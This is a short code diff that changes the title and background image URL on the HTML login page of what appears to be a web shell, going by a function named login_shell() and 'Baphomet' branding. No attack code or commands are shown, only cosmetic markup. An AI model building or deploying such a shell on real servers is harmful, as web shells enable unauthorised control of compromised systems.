@@ -33,13 +33,13 @@ function login_shell() {
     <meta name="theme-color" content="#343a40"/>
     <meta name="author" content="Holiq"/>
     <meta name="copyright" content="{ baphomet }"/>
-    <title>{ ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ }</title>
+    <title>❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞</title>
     <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/baphomet.png"/>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
     <style>
         body {
-            background-image: url('https://ibb.co.com/MNcRN1W');
+            background-image: url('https://ibb.co/MNcRN1W');
             background-size: cover; /* Menutupi seluruh halaman */
             background-position: center; /* Memposisikan gambar di tengah */
             height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
